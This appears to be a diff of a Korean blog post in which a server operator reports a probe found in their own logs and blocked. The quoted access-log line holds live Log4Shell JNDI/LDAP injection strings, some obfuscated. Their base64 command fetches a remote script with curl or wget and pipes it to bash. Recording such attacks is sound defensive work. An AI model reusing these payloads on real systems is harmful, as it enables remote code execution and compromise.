@@ -248,7 +248,7 @@ server {
 클라우드 서버긴 하지만, 운영중에 있어 참고할 만한 내용같아서 링크만 남겨둔다.  
 (실제 로그에서 봤던 내용도 있어,,, 요녀석들 참 집요하다 싶다.)  
 
- * 내 서버에도 이런로그가 발견되었다. 이런 하꼬서버에도 찾아주시는 분들이라니... 아쉽게도 http로 접속하셔서 차단박았다.
+ * 내 서버에도 이런로그가 발견되었다. 이런 하꼬서버에도 찾아주시는 분들이라니... 아쉽게도 IP로 접속하셔서 차단박았다.
  ```
 195.54.160.149 - - [25/Dec/2021:02:27:48 +0900] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=} HTTP/1.1" 400 230 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=}" "-"
 
